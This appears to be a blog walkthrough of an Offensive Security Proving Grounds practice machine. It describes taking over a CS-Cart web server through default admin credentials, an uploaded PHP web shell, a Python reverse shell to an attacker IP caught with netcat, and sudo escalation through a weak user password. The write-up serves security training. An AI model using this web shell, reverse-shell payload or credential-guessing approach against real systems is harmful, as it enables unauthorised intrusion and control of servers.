---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Performing a `nmap` scan to identifiy the attack surface of the target.

## port scan
```bash
$ nmap -p- -sV 192.168.126.39
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 09:39 EST
Nmap scan report for 192.168.126.39
Host is up (0.026s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds
```

## port 80 (web server)
Software `cs-cart` is used.

---

# exploitation

## default login
> The installed software `cs-cart` has an admin login under `admin.php` and uses weak credentials (`admin:admin`)
{: .prompt-info }

## exploit search
```bash
$ searchsploit cs-cart       
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CS-Cart - Multiple SQL Injections                                                                                                                                                                         | php/webapps/27030.txt
CS-Cart 1.3.2 - 'index.php' Cross-Site Scripting                                                                                                                                                          | php/webapps/31443.txt
CS-Cart 1.3.3 - 'classes_dir' LFI                                                                                                                                                                         | php/webapps/48890.txt
CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion                                                                                                                                                       | php/webapps/1872.txt
CS-Cart 1.3.3 - 'install.php' Cross-Site Scripting                                                                                                                                                        | multiple/webapps/14962.txt
CS-Cart 1.3.3 - authenticated RCE                                                                                                                                                                         | php/webapps/48891.txt
CS-Cart 1.3.5 - Authentication Bypass                                                                                                                                                                     | php/webapps/6352.txt
CS-Cart 2.0.0 Beta 3 - 'Product_ID' SQL Injection                                                                                                                                                         | php/webapps/8184.txt
CS-Cart 2.0.5 - 'reward_points.post.php' SQL Injection                                                                                                                                                    | php/webapps/33146.txt
CS-Cart 2.2.1 - 'products.php' SQL Injection                                                                                                                                                              | php/webapps/36093.txt
CS-Cart 4.2.4 - Cross-Site Request Forgery                                                                                                                                                                | php/webapps/36358.html
CS-Cart 4.3.10 - XML External Entity Injection                                                                                                                                                            | php/webapps/40770.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

`CS-Cart 1.3.3 - authenticated RCE` looks juicy.

```
# Exploit Title: CS-Cart authenticated RCE
# Date: 2020-09-22
# Exploit Author:  0xmmnbassel
# Vendor Homepage: https://www.cs-cart.com/e-commerce-platform.html
# Tested at: ver. 1.3.3
# Vulnerability Type: authenticated RCE



get PHP shells from
http://pentestmonkey.net/tools/web-shells/php-reverse-shell
edit IP && PORT
Upload to file manager
change the extension from .php to .phtml
visit http://[victim]/skins/shell.phtml --> Profit. ...!
```

## uploading shell
`shell.php` content
```php
<?php system($_REQUEST['cmd']); ?>
```

Upload `shell.php` via file manager and change extension to `.phtml`


## check shell
### request
```http
GET /skins/shell.phtml?cmd=whoami HTTP/1.1
Host: 192.168.126.39
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Date: Fri, 11 Feb 2022 14:54:58 GMT
Server: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
X-Powered-By: PHP/5.2.3-1ubuntu6
Connection: close
Content-Type: text/html
Content-Length: 9

www-data
```

---

# post exploitation
## reverse shell
### start listener on attacker machine
```bash
$ nc -lvp 80
```

### start reverse shell
payload: ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.126",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```
```http
GET /skins/shell.phtml?cmd=python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("192.168.49.126",80))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b' HTTP/1.1
Host: 192.168.126.39
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### catch reverse shell on attacker machine
```bash
$ nc -lvp 80
listening on [any] 80 ...
192.168.126.39: inverse host lookup failed: Unknown host
connect to [192.168.49.126] from (UNKNOWN) [192.168.126.39] 35403
/bin/sh: can't access tty; job control turned off
$ whoami
www-data
```

## first flag
```bash
$ cd /home
$ ls
patrick
$ cd patrick
$ ls
local.txt
$ cat local.txt
f******************************b
```

## privilege escalation
- `root` folder is readable by `www-data`
- `proof.txt` is only readable by `root`
- `root` folder contains `capture.cap` file containing a `ftp` password for `brett`
- the user `brett` is not available on the system (see `/etc/passwd`)
- `ftp` is not available on the system
- `capture.cap` is not useful
- user `patrick` is available (see `/etc/passwd`)

### weak credentials
User `patrick` uses weak credentials (`patrick:patrick`).

## escalation
`patrick` is in `sudo` group.

```bash
patrick@payday:/root$ sudo su
sudo su
root@payday:~# cat proof.txt
cat proof.txt
9******************************b
```

Pwned! <@:-)
